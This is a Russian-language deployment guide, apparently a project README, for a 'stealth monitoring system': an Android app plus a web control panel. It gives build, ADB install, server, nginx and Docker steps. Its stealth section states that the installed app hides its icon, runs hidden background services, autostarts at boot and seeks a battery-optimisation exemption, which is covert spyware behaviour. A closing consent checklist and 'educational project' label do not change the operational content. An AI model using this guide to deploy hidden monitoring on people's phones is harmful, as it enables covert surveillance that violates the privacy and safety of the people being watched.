# 🚀 Руководство по развертыванию стелс системы мониторинга

## 📋 Предварительные требования

### 🛠️ Инструменты разработчика
- **Android Studio** 4.2+ с Android SDK
- **Java/Kotlin** поддержка
- **Git** для управления версиями
- **Node.js** 16+ для веб-панели

### 📱 Тестовые устройства
- Android устройство с **версией 5.0-14** (API 21-34)
- **Режим разработчика** включен
- **USB отладка** активирована
- **Неизвестные источники** разрешены

## 📱 Развертывание Android приложения

### 1️⃣ **Подготовка проекта**

```bash
# Клонирование репозитория
git clone https://github.com/ReliableSecurity/android-remote-monitoring.git
cd android-remote-monitoring

# Открыть в Android Studio
# File -> Open -> Выбрать папку android-app
```

### 2️⃣ **Конфигурация**

```gradle
// android-app/app/build.gradle
android {
    compileSdk 34
    
    defaultConfig {
        applicationId "com.example.remotemonitor"
        minSdk 21        // Android 5.0
        targetSdk 34     // Android 14
        versionCode 1
        versionName "1.0.0"
    }
    
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
            
            // Подпись APK для production
            signingConfig signingConfigs.release
        }
    }
}
```

### 3️⃣ **Сборка APK**

```bash
# Debug сборка для тестирования
./gradlew assembleDebug

# Release сборка с подписью
./gradlew assembleRelease

# APK файлы будут в:
# android-app/app/build/outputs/apk/debug/
# android-app/app/build/outputs/apk/release/
```

### 4️⃣ **Установка на устройство**

```bash
# Через ADB
adb install app-debug.apk

# Или перенести APK на устройство и установить вручную
```

## 🕵️ Активация стелс режима

### 🔄 **Автоматическая активация**
После установки приложение:
1. **Автоматически скроется** с рабочего стола
2. **Запустит фоновые сервисы**
3. **Зарегистрируется на автозапуск** при загрузке
4. **Запросит исключение** из оптимизации батареи

### ⚙️ **Ручная настройка (при необходимости)**

```bash
# Проверка работы сервисов
adb shell dumpsys activity services | grep StealthService
adb shell dumpsys activity services | grep MonitoringService

# Проверка автозапуска
adb shell dumpsys package com.example.remotemonitor | grep -A5 "Receiver"

# Логи стелс сервиса  
adb logcat -s StealthService BootReceiver
```

## 🌐 Развертывание веб-панели

### 1️⃣ **Установка зависимостей**

```bash
cd web-control-panel

# Установка Node.js пакетов
npm install

# Или использовать Yarn
yarn install
```

### 2️⃣ **Конфигурация**

```javascript
// config/config.js
module.exports = {
    server: {
        port: 8443,
        ssl: {
            enabled: true,
            cert: './ssl/server.crt',
            key: './ssl/server.key'
        }
    },
    
    database: {
        type: 'sqlite',
        path: './data/monitoring.db'
    },
    
    auth: {
        jwtSecret: 'your-super-secret-key',
        sessionTimeout: 24 * 60 * 60 * 1000  // 24 часа
    },
    
    monitoring: {
        maxDevices: 100,
        dataRetentionDays: 30
    }
};
```

### 3️⃣ **SSL сертификаты**

```bash
# Создание самоподписанного сертификата для разработки
openssl req -x509 -newkey rsa:4096 -keyout ssl/server.key -out ssl/server.crt -days 365 -nodes

# Или использовать Let's Encrypt для production
certbot --nginx -d yourdomain.com
```

### 4️⃣ **Запуск сервера**

```bash
# Режим разработки
npm run dev

# Production режим
npm run build
npm start

# Или с PM2 для автозапуска
pm2 start npm --name "monitoring-panel" -- start
pm2 startup
pm2 save
```

## 🔐 Безопасная конфигурация

### 🛡️ **Защита веб-панели**

```nginx
# /etc/nginx/sites-available/monitoring-panel
server {
    listen 443 ssl http2;
    server_name monitoring.yourdomain.com;
    
    ssl_certificate /path/to/ssl/cert.pem;
    ssl_certificate_key /path/to/ssl/private.key;
    
    # Современные SSL настройки
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;
    
    # Ограничение доступа по IP
    allow 192.168.1.0/24;
    allow 10.0.0.0/8;
    deny all;
    
    location / {
        proxy_pass https://localhost:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

### 🔥 **Настройка файрвола**

```bash
# UFW (Ubuntu/Debian)
ufw allow 22/tcp      # SSH
ufw allow 8443/tcp    # Веб-панель
ufw allow 443/tcp     # HTTPS
ufw --force enable

# iptables
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 8443 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
```

## 📊 Мониторинг и диагностика

### 📈 **Проверка состояния системы**

```bash
# Android устройство
adb shell dumpsys activity services | grep -E "(Stealth|Monitoring)"
adb shell dumpsys battery | grep level
adb shell dumpsys location

# Веб-сервер
curl -k https://localhost:8443/api/status
pm2 status
netstat -tlnp | grep 8443
```

### 📋 **Логирование**

```bash
# Android логи
adb logcat -s StealthService MonitoringService BootReceiver

# Серверные логи
tail -f logs/monitoring-panel.log
tail -f /var/log/nginx/access.log
```

### 🔍 **Отладка проблем**

```bash
# Проверка разрешений на Android
adb shell dumpsys package com.example.remotemonitor | grep -A20 "granted=true"

# Проверка автозапуска
adb shell settings get global boot_count
adb shell dumpsys deviceidle | grep -A5 "whitelist"

# Проверка сети
ping monitoring.yourdomain.com
nmap -p 8443 localhost
```

## 🚀 Production развертывание

### 🌐 **Облачная инфраструктура**

```yaml
# docker-compose.yml
version: '3.8'

services:
  monitoring-panel:
    build: .
    ports:
      - "8443:8443"
    environment:
      - NODE_ENV=production
      - DB_PATH=/data/monitoring.db
    volumes:
      - ./data:/data
      - ./ssl:/app/ssl
    restart: unless-stopped
    
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
      - ./ssl:/etc/ssl/certs
    depends_on:
      - monitoring-panel
    restart: unless-stopped
```

### 📊 **Автоматическое масштабирование**

```bash
# Kubernetes deployment
kubectl apply -f k8s/
kubectl scale deployment monitoring-panel --replicas=3

# Или Docker Swarm
docker stack deploy -c docker-compose.yml monitoring
```

## ⚖️ Соблюдение требований

### 📋 **Чек-лист перед развертыванием**

- [ ] **Согласие пользователей** получено и зафиксировано
- [ ] **Локальное законодательство** изучено и соблюдается
- [ ] **Корпоративные политики** учтены (при применимости)
- [ ] **Шифрование данных** настроено и активно
- [ ] **Доступ ограничен** только авторизованным пользователям
- [ ] **Логирование активности** настроено
- [ ] **Резервное копирование** данных организовано
- [ ] **План инцидентов** подготовлен

### ⚠️ **Предупреждения**

> **🚨 ВНИМАНИЕ**: Эта система может собирать чувствительные персональные данные. Убедитесь в полном соблюдении:
> - GDPR (Европа)
> - CCPA (Калифорния) 
> - Местного законодательства о защите данных
> - Корпоративных политик безопасности

### 📞 **Поддержка**

- **GitHub Issues**: Технические проблемы
- **Telegram**: [@ReliableSecurity](https://t.me/ReliableSecurity)
- **Документация**: [docs/](docs/) папка в репозитории

---

**👨‍💻 Автор**: [ReliableSecurity](https://github.com/ReliableSecurity)  
**📚 Образовательный проект** для изучения Android API и системного программирования